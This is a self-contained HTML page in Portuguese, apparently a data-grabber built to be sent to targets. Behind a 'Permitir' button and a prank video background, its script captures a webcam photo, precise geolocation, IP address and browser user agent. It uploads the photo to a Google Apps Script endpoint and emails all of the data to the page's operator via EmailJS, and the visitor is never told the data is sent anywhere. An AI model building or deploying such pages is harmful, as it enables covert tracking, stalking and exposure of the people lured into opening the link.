<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Captura de Dados</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      overflow: hidden;
      font-family: sans-serif;
      color: white;
    }

    #video-bg {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      z-index: -1;
      pointer-events: none;
    }

    #content {
      position: relative;
      z-index: 2;
      padding: 2rem;
      text-align: center;
      background-color: rgba(0,0,0,0.5);
    }

    video, canvas {
      margin-top: 1rem;
      border-radius: 8px;
    }

    button {
      padding: 1rem 2rem;
      font-size: 1rem;
      border: none;
      border-radius: 6px;
      background-color: #007bff;
      color: white;
      cursor: pointer;
    }

    #data {
      margin-top: 1rem;
    }
  </style>
</head>
<body>

<!-- Vídeo de fundo -->
<div id="video-bg">
  <iframe width="100%" height="100%" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div>

<div id="content">
  <h1>Permita Captura de Foto e Localização -2.1</h1>
  <button onclick="capturar()">Permitir</button>

  <div id="data">
    <video id="video" autoplay playsinline width="320" height="240" style="display:none;"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
    <p id="location"></p>
  </div>
</div>

<!-- EmailJS SDK -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
  emailjs.init("3nQv9Y-aSYhq53HDi"); // sua chave pública do EmailJS
</script>

<script>
  async function capturar() {
    let latitude = null;
    let longitude = null;
    let imageBase64 = null;
    let ip = null;
    let userAgent = navigator.userAgent;
    let googleMapsLink = null;
    let linkImagemDrive = null;

    const obterIP = async () => {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch (e) {
        console.warn("IP não disponível:", e);
        return null;
      }
    };

    const obterLocalizacao = () => {
      return new Promise(resolve => {
        if (!navigator.geolocation) {
          resolve(null);
        } else {
          navigator.geolocation.getCurrentPosition(
            pos => resolve({
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude
            }),
            err => {
              console.warn("Erro de geolocalização:", err.message);
              resolve(null);
            },
            {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0
            }
          );
        }
      });
    };

    const capturarImagem = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        video.srcObject = stream;
        video.style.display = 'block';

        await new Promise(resolve => setTimeout(resolve, 2000));

        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.style.display = 'block';
        stream.getTracks().forEach(track => track.stop());

        return canvas.toDataURL('image/jpeg');
      } catch (e) {
        console.warn("Erro ao acessar câmera:", e.message);
        return null;
      }
    };

  const uploadParaDrive = async (imageBase64) => {
  const url = "https://script.google.com/macros/s/AKfycbzoinFdcKunrWrDhxHDSXfNswmB1y64ZgjwfrFRYvNIPr2d1-NDDoponlNGegHXZn2kcw/exec";
  try {
    const res = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ image: imageBase64 })
    });

    const data = await res.json();

    // ⚠️ Esta linha abaixo é ESSENCIAL
    return data.link || null;

  } catch (e) {
    console.error("Erro ao enviar para o Drive:", e.message);
    return null;
  }
};

    // Executar tudo
    const [ipResult, locResult, imgResult] = await Promise.all([
      obterIP(),
      obterLocalizacao(),
      capturarImagem()
    ]);

    ip = ipResult;
    imageBase64 = imgResult;

    if (locResult) {
      latitude = locResult.latitude;
      longitude = locResult.longitude;
      document.getElementById('location').innerText =
        `Localização: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
      googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    }

    if (imageBase64) {
      linkImagemDrive = await uploadParaDrive(imageBase64);
    }

    const params = {
      latitude: latitude || "Não capturado",
      longitude: longitude || "Não capturado",
      google_maps: googleMapsLink || "Não disponível",
      ip_address: ip || "Não capturado",
      user_agent: userAgent || "Não disponível",
      link_imagem: linkImagemDrive || "Imagem não capturada"
    };

    emailjs.send('service_zrwt5s7', 'template_xcfeb16', params)
      .then(() => {
        alert("E-mail enviado com sucesso com os dados e imagem no Drive!");
      })
      .catch(err => {
        console.error("Erro ao enviar e-mail:", err);
        alert("Erro ao enviar e-mail.");
      });
  }
</script>

</body>
</html>
